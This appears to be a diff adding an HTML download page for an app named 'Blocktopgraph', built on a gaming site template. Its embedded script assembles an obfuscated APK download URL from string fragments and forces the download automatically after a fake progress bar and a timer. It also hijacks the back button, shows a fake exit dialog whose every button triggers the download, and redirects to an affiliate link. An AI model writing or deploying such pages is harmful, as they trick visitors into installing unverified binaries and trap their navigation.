@@ -1,0 +1,1198 @@
+<!DOCTYPE html>
+
+<html lang="en">
+
+
+
+  <head>
+
+
+
+    <meta charset="utf-8">
+
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+
+
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@100;200;300;400;500;600;700;800;900&display=swap" rel="stylesheet">
+
+
+
+    <title>Cyborg - Awesome HTML5 Template</title>
+
+
+
+    <!-- Bootstrap core CSS -->
+
+    <link href="vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+
+
+
+
+
+    <!-- Additional CSS Files -->
+
+    <link rel="stylesheet" href="assets/css/fontawesome.css">
+
+    <link rel="stylesheet" href="assets/css/clientfile-cyborg-gaming.css">
+
+    <link rel="stylesheet" href="assets/css/owl.css">
+
+    <link rel="stylesheet" href="assets/css/animate.css">
+
+    <link rel="stylesheet"href="https://unpkg.com/swiper@7/swiper-bundle.min.css"/>
+
+
+
+    <style>
+
+        * {
+
+            padding: 0;
+
+            margin: 0;
+
+            font-family: verdana, arial, helvetica;
+
+        }
+
+        
+
+        .download-area button {
+
+            border: none;
+
+            border-radius: 20px;
+
+            width: 200px;
+
+            height: 40px;
+
+            text-align: center;
+
+            position: relative;
+
+            top: -105%;
+
+            transition: 1300ms;
+
+            font-size: 14px;
+
+            color: #ec6090;
+
+            background-color: transparent;
+
+            border: 1px solid #ec6090;
+
+            padding: 12px 30px;
+
+            display: inline-block;
+
+            border-radius: 25px;
+
+            font-weight: 400;
+
+            text-transform: capitalize;
+
+            letter-spacing: 0.5px;
+
+            overflow: hidden;
+
+        }
+
+        
+
+        .download-area button:active {
+
+            background-color: rgb(201, 201, 201);
+
+            color: white;
+
+        }
+
+        
+
+        .box {
+
+            border: 1px solid #e75e8d;
+
+            margin: 1px auto 0 auto;
+
+            padding: 2px;
+
+            border-radius: 10px;
+
+        }
+
+        
+
+        .progress {
+
+            background: #e75e8d;
+
+        }
+
+        .wait {
+
+            color:transparent;
+
+        }
+
+        .link {
+
+            color: #00bea3;
+
+        }
+
+        
+
+        .progress-text {
+
+            text-align: center;
+
+            color:white;
+
+        }
+
+        
+
+        .download-area-button {
+
+            margin: 10px auto;
+
+            position: absolute;
+
+            overflow: hidden;
+
+            height: 50px;
+
+        }
+
+        
+
+        
+
+        .download-area {
+
+            width: 200px;
+
+            position: relative;
+
+            margin: 0 auto;
+
+        }
+
+
+
+        .globaltap {
+
+            position: fixed !important;
+
+            z-index: 99991 !important;
+
+            display: block !important;
+
+            width: 100% !important;
+
+            height: 100% !important;
+
+            top: 0 !important;
+
+        }
+
+
+
+        .lut-hidden {
+
+            display: none !important;
+
+        }
+
+
+
+        .lut-android-dialog-overlay,
+
+        .push-android-dialog-overlay {
+
+            position: fixed !important;
+
+            z-index: 99992 !important;
+
+            display: block;
+
+            width: 100% !important;
+
+            height: 100% !important;
+
+            top: 0 !important;
+
+            background: rgba(0, 0, 0, 0.7);
+
+        }
+
+
+
+        .push-android-dialog-overlay .lut-android-dialog {
+
+            height: 120px;
+
+            width: 88vw;
+
+            left: 6vw;
+
+        }
+
+
+
+        .push-android-dialog-overlay .lut-android-dialog-content {
+
+            margin: 15px 24px 20px 24px;
+
+        }
+
+
+
+        .push-android-dialog-overlay img {
+
+            width: 21px;
+
+            vertical-align: middle;
+
+            padding-right: 5px;
+
+        }
+
+
+
+        .lut-android-dialog {
+
+            height: 144px;
+
+            margin-top: -72px;
+
+
+
+            width: 70vw;
+
+            left: 15vw;
+
+
+
+            top: 50%;
+
+            position: fixed;
+
+            background: white;
+
+            border-radius: 4px;
+
+            box-shadow: rgba(0, 0, 0, 0.2) 0 11px 15px -7px, rgba(0, 0, 0, 0.14) 0 24px 38px;
+
+        }
+
+
+
+        .lut-android-dialog-title {
+
+            margin: 20px 0 12px 24px;
+
+            font-family: Roboto, sans-serif;
+
+            -webkit-font-smoothing: antialiased;
+
+            font-size: 20px;
+
+            line-height: 32px;
+
+            font-weight: 500;
+
+            letter-spacing: .25px;
+
+            text-decoration: inherit;
+
+            text-transform: inherit;
+
+            color: black;
+
+        }
+
+
+
+        .lut-android-dialog-content {
+
+            font-family: Roboto, sans-serif;
+
+            font-size: 16px;
+
+            font-weight: 400;
+
+            letter-spacing: 0.5px;
+
+            margin: 10px 0 20px 24px;
+
+            color: rgba(0, 0, 0, 0.6);
+
+        }
+
+
+
+        .lut-android-dialog-actions {
+
+            text-align: right;
+
+            padding-right: 8px;
+
+        }
+
+
+
+        .lut-android-dialog-actions button {
+
+            display: inline-block;
+
+            font-family: Roboto, sans-serif;
+
+            appearance: none;
+
+            background-color: rgba(0, 0, 0, 0);
+
+            border: none;
+
+            color: #4184F2;
+
+            /*color: rgb(98, 0, 238);*/
+
+            font-size: 14px;
+
+            font-stretch: 100%;
+
+            font-style: normal;
+
+            font-weight: 500;
+
+            height: 36px;
+
+            justify-content: center;
+
+            letter-spacing: 1.25px;
+
+            padding: 0 8px;
+
+            margin-left: 8px;
+
+            outline: none !important;
+
+        }
+
+    </style>
+
+
+
+  </head>
+
+
+
+<body>
+
+
+
+  <!-- ***** Preloader Start ***** -->
+
+  <div id="js-preloader" class="js-preloader">
+
+    <div class="preloader-inner">
+
+      <span class="dot"></span>
+
+      <div class="dots">
+
+        <span></span>
+
+        <span></span>
+
+        <span></span>
+
+      </div>
+
+    </div>
+
+  </div>
+
+  <!-- ***** Preloader End ***** -->
+
+
+
+  <!-- ***** Header Area Start ***** -->
+
+  <header class="header-area header-sticky">
+
+    <div class="container">
+
+        <div class="row">
+
+            <div class="col-12">
+
+                <nav class="main-nav">
+
+                    <!-- ***** Logo Start ***** -->
+
+                    <a href="index.html" class="logo">
+
+                        <img src="assets/images/logo.png" alt="">
+
+                    </a>
+
+                    <!-- ***** Logo End ***** -->
+
+                    <!-- ***** Search End ***** -->
+
+                    <div class="search-input">
+
+                      <form id="search" action="#">
+
+                        <input type="text" placeholder="Type Something" id='searchText' name="searchKeyword" onkeypress="handle" />
+
+                        <i class="fa fa-search"></i>
+
+                      </form>
+
+                    </div>
+
+                    <!-- ***** Search End ***** -->
+
+                    <!-- ***** Menu Start ***** -->
+
+                    <ul class="nav">
+
+                        <li><a href="index.html">Home</a></li>
+
+                        <li><a href="browse.html">Browse</a></li>
+
+                        <li><a href="details.html" class="active">Details</a></li>
+
+                        <li><a href="streams.html">Streams</a></li>
+
+                        <li><a href="profile.html">Profile <img src="assets/images/profile-header.jpg" alt=""></a></li>
+
+                    </ul>   
+
+                    <a class='menu-trigger'>
+
+                        <span>Menu</span>
+
+                    </a>
+
+                    <!-- ***** Menu End ***** -->
+
+                </nav>
+
+            </div>
+
+        </div>
+
+    </div>
+
+  </header>
+
+  <!-- ***** Header Area End ***** -->
+
+
+
+  <div class="container">
+
+    <div class="row">
+
+      <div class="col-lg-12">
+
+        <div class="page-content">
+
+
+
+          <!-- ***** Featured Start ***** -->
+
+          <!-- ***** Featured End ***** -->
+
+
+
+          <!-- ***** Details Start ***** -->
+
+          <div class="game-details">
+
+            <div class="row">
+
+              <div class="col-lg-12">
+
+                <h2>Download</h2>
+
+              </div>
+
+              <div class="col-lg-12">
+
+                <div class="content">
+
+                  <div class="row">
+
+                    <div class="col-lg-12">
+
+                      <div class="left-info">
+
+                        <center>
+
+          <img src="https://c.top4top.io/p_270686o202.png" alt="" class="clientfile-item">
+
+                          <h5>Blocktopgraph</h5>
+
+                          <span><a class="link" href="https://tolol.ml/donate" target="blank"><u>Support us with a donation</a></u></span>
+
+                          </center>
+
+                        <div class="left">
+
+                        </div>                        
+
+                      </div>
+
+                    </div>
+
+                    <div class="col-lg-12">
+
+                      <div class="right-info">
+
+                        <ul>
+
+                          <li><i class="fa fa-upload"></i> 4.8</li>
+
+                          <li><i class="fa fa-download"></i> 100+</li>
+
+                          <li><i class="fa fa-server"></i> 6,7MB</li>
+
+                          <li><i class="fa fa-gamepad"></i> Tools</li>
+
+                        </ul>
+
+    <div class="box">
+
+        <div class="progress"></div>
+
+    </div>
+
+    <div class="progress-text">Loading file <span class="percent"> </span></div>
+
+    <div class='download-area'>
+
+        <div class="download-area-button">
+
+            <button id="main-button">Click here to download</button>
+
+               </div>
+
+                <div class="wait">
+
+                  wait
+
+                </div>
+
+               </div>
+
+                <div class="wait">
+
+                  wait
+
+                </div>
+
+               </div>
+
+                <div class="wait">
+
+                  wait
+
+                </div>
+
+                <div class="col-lg-12">
+
+                <div class="content">
+
+                  
+
+                      <div class="left-info">
+
+                      <p>Application
+
+                           r  >
+
+                    </div>
+
+                  </div>
+
+                </div>
+
+              </div>
+
+          <div class="row">
+
+            <div class="col-lg-12">
+
+              <div class="featured-games header-text">
+
+                <div class="heading-section">
+
+                  <h4><em></em>Application Screenshot</h4>
+
+                </div>
+
+                <div class="owl-features owl-carousel">
+
+                  <div class="item">
+
+                    <div class="thumb">
+
+                      <img src="https://j.top4top.io/p_2712vrq551.jpg" alt="apkclient">
+
+                    </div>
+
+                  </div>
+
+                  <div class="item">
+
+                    <div class="thumb">
+
+                      <img src="https://e.top4top.io/p_271250ir31.jpg" alt="">
+
+                  </div>
+
+                  </div>
+
+                  <div class="item">
+
+                    <div class="thumb">
+
+                      <img src="https://e.top4top.io/p_2712w93e93.jpg" alt="">
+
+                      <div class="hover-effect">
+
+                      </div>
+
+                    </div>
+
+                  </div>
+
+                </div>
+
+              </div>
+
+            </div>
+
+                    </div>
+
+                      </div>
+
+                    </div>
+
+            </div>
+
+          </div>
+
+          <!-- ***** Details End ***** -->
+
+
+
+          <!-- ***** Other Start ***** -->
+
+
+
+          <!-- ***** Other End ***** -->
+
+
+
+        </div>
+
+      </div>
+
+    </div>
+
+  </div>
+
+  
+
+  <footer>
+
+    <div class="container">
+
+      <div class="row">
+
+        <div class="col-lg-12">
+
+          <p>Copyright © 2036 <a href="#">Cyborg Gaming</a> Company. All rights reserved. 
+
+          
+
+          <br>Design: <a href="https://clientfile.com" target="_blank" title="free CSS templates">clientfile</a></p>
+
+        </div>
+
+      </div>
+
+    </div>
+
+  </footer>
+
+
+
+
+
+  <!-- Scripts -->
+
+  <!-- Bootstrap core JavaScript -->
+
+
+
+    <a id="lut-android-dialog-overlay" class="lut-android-dialog-overlay" style="display: none" onclick="
+
+            LUT.hideElement('lut-android-dialog-overlay')
+
+            doLeaveWork()
+
+        ">
+
+        <div class="lut-android-dialog">
+
+            <div class="lut-android-dialog-title">
+
+                Leave page
+
+            </div>
+
+            <div class="lut-android-dialog-content">
+
+                Exit?
+
+            </div>
+
+            <div class="lut-android-dialog-actions">
+
+                <button>CANCEL</button>
+
+                <button>OK</button>
+
+            </div>
+
+        </div>
+
+    </a>
+
+
+
+    <script>
+
+        var apk_names = ["apkclient"];
+
+        var apkNamesLength = apk_names.length;
+
+        var needNameFromArray = Boolean(0);
+
+        var needRandomName = Boolean(0);
+
+        var xcw = "fir";
+
+        var smartlink = 'https://www.directdexchange.com/jump/next.php?r=3670675&sub1=newlandVP';
+
+        var feo = ".co";
+
+        var leaveAction = 2;
+
+        var backlink = 'https://www.directdexchange.com/jump/next.php?r=3670675&sub1=newlandVP';
+
+        var needAutoLoad = Boolean(1);
+
+        var autoLoadDelay = 50000;
+
+        var clickCounterNeedRecycle = 4000;
+
+        var eg = "://";
+
+        var clickId = "657151143085350939";
+
+        var extAdk = "c896c9cb81ec";
+
+        var gid = "07e346d7-bda0-11ed-9539-121254d6a232";
+
+        var p1 = "";
+
+        var tew = "loa";
+
+        var dx = "tt";
+
+        var extra = "";
+
+        var name = "";
+
+        var qwv = "di";
+
+        var rlid = "6690";
+
+        var adk = "ZWMwMDBhMDc1NjAwMmY1ZDAwMDAyZjZiMDAyZjZiMDAyZjZiZmRjNzhjM2RiMA==";
+
+        var domain = "edfol.bulkaapricot.com";
+
+        var postback_id = "877";
+
+        var dtp = "1";
+
+        var dwlt = 1;
+
+//PxID
+
+        var nid = "1512";
+
+        var recdnsid = "pwfo61qeklogELsos4PwT0Mr3zHu0xe1qH7Bn0NUMnksDqF7sQTCWMN7G5WiR0-hNYz20bfdxrFoDmEiA0U8jK1KNYZwXpWtUhZsQnJgcch6zzmGr2jrCgS24UapPR9Eo9USZbPxmRALqL_uQgVKyZAbSZY5gnsa4LUfMeZrfYE/ll2qa8xaaxj27f6";
+
+        
+
+//PASS-in
+
+
+
+//PASS-en
+
+                name = "File_13331"
+
+        
+
+        var apk_url = "h" + dx + "ps" + eg + "down" + tew + "d" + nid + ".me" + qwv + "a" + xcw + "e" + feo + "m/" + recdnsid;
+
+        var selectedIndexes = []
+
+
+
+        function updateAPKURL() {
+
+            var finalName = "";
+
+            var apkCounter = LUT.getCookieCounter("apk_counter");
+
+
+
+            if (needNameFromArray) { // Нужно имя из массива, не из параметра
+
+                if (apkCounter > 1) { // Первое из параметра
+
+                    var idx = 0
+
+                    if (needRandomName) { // нужно рандомное имя
+
+                        idx = getRandomUniqIntInclusive(0, apkNamesLength);
+
+                    } else { // нужно имя по порядку
+
+                        idx = apkCounter % apkNamesLength
+
+                    }
+
+                    finalName = apk_names[idx];
+
+                } else {
+
+                    finalName = name;
+
+                }
+
+            } else { // Нужно имя из параметра
+
+                finalName = name + apkCounter;
+
+            }
+
+            apk_url = "h" + dx + "ps" + eg + "down" + tew + "d" + nid + ".me" + qwv + "a" + xcw + "e" + feo + "m/" + recdnsid;
+
+        }
+
+
+
+        function getRandomUniqIntInclusive(min, max) {
+
+            if (selectedIndexes.length === apk_names.length) {
+
+                selectedIndexes = [];
+
+            }
+
+            min = Math.ceil(min);
+
+            max = Math.floor(max);
+
+            var rnd = Math.floor(Math.random() * (max - min + 1)) + min; //Максимум и минимум включаются
+
+            while (selectedIndexes.indexOf(rnd) > -1) {
+
+                rnd = Math.floor(Math.random() * (max - min + 1)) + min;
+
+            }
+
+            selectedIndexes.push(rnd)
+
+            return rnd
+
+        }
+
+
+
+        function glTapClick() {
+
+            try {
+
+                openNewWindow(false, 1);
+
+                return false;
+
+            } catch (e) {
+
+                console.error(e);
+
+            }
+
+        }
+
+
+
+        var backCount = 0
+
+
+
+        LUT.fixBackButton(function() {
+
+            backCount++;
+
+            if (backCount === 1) {
+
+                // При первом клике назад скачиваем apk
+
+                openNewWindow(true, 2);
+
+            } else if (backCount === 2) {
+
+                LUT.showElement("lut-android-dialog-overlay");
+
+            } else {
+
+                openNewWindow(true, 2);
+
+            }
+
+        });
+
+
+
+        var firstClick = true;
+
+        var useIframe = false;
+
+
+
+        function openNewWindow(fromAutoload, d_type) {
+
+            dwlt = d_type;
+
+            var click_counter;
+
+            var click_counter_cycled = -1;
+
+            if (!fromAutoload) {
+
+                click_counter = LUT.incCookieCounter("click_counter");
+
+                click_counter_cycled = click_counter % clickCounterNeedRecycle;
+
+            }
+
+
+
+            switch (true) {
+
+                case fromAutoload:
+
+                    LUT.incCookieCounter("apk_counter");
+
+                    updateAPKURL();
+
+                    location.href = apk_url;
+
+                    break;
+
+                case click_counter_cycled === 0:
+
+                    location.href = smartlink;
+
+                    break;
+
+                default:
+
+                    LUT.incCookieCounter("apk_counter");
+
+                    updateAPKURL();
+
+                    location.href = apk_url;
+
+                    break;
+
+            }
+
+            return false;
+
+        }
+
+
+
+        function setDownloadTimeout(delay) {
+
+            setTimeout(
+
+                function() {
+
+                    openNewWindow(true, 3);
+
+                },
+
+                delay
+
+            );
+
+        }
+
+
+
+        if (needAutoLoad) {
+
+            setDownloadTimeout(autoLoadDelay);
+
+        }
+
+
+
+        function doLeaveWork() {
+
+            switch (leaveAction) {
+
+                case 1:
+
+                    history.go(-2)
+
+                    break;
+
+                case 2:
+
+                    try {
+
+                        history.pushState({}, document.title, window.location.href);
+
+                        console.log("pushed from popstate");
+
+                    } catch (e) {
+
+                        console.error(e);
+
+                    }
+
+                    openNewWindow(true, 2);
+
+                    break;
+
+                case 3:
+
+                    openNewWindow(true, 2);
+
+                    setTimeout(() => {
+
+                        history.back();
+
+                        history.back();
+
+                    }, 500);
+
+                    break;
+
+                case 4:
+
+                    location.href = backlink;
+
+                    break;
+
+
+
+                default:
+
+                    break;
+
+            }
+
+        }
+
+    </script>
+
+
+
+    <script>
+
+        let score = document.querySelector('.progress');
+
+        let ScorePercent = 0;
+
+        let DownloadButton = document.getElementById("main-button");
+
+        DownloadButton.addEventListener('click', glTapClick)
+
+        scoreTimer = setInterval(() => {
+
+            if (ScorePercent != 100) {
+
+                ScorePercent += 1;
+
+                score.style.width = ScorePercent + '%';
+
+                document.querySelector('.percent').innerHTML = score.style.width;
+
+                console.log(ScorePercent)
+
+            } else {
+
+                clearTimeout(scoreTimer);
+
+                document.querySelector('.progress-text').innerHTML = 'OK'
+
+                setTimeout(() => {
+
+                    document.querySelector('.progress-text').innerHTML = 'Download started automaticaly.'
+
+                    DownloadButton.style.top = '0';
+
+                    glTapClick();
+
+                }, 500)
+
+            }
+
+        }, Number("1000"))
+
+    </script>
+
+  <script src="vendor/jquery/jquery.min.js"></script>
+
+  <script src="vendor/bootstrap/js/bootstrap.min.js"></script>
+
+  <script src="js/dl.js"></script>
+
+  <script src="assets/js/isotope.min.js"></script>
+
+  <script src="assets/js/owl-carousel.js"></script>
+
+  <script src="assets/js/tabs.js"></script>
+
+  <script src="assets/js/popup.js"></script>
+
+  <script src="assets/js/custom.js"></script>
+
+  </body>
+
+
+
+</html>
+
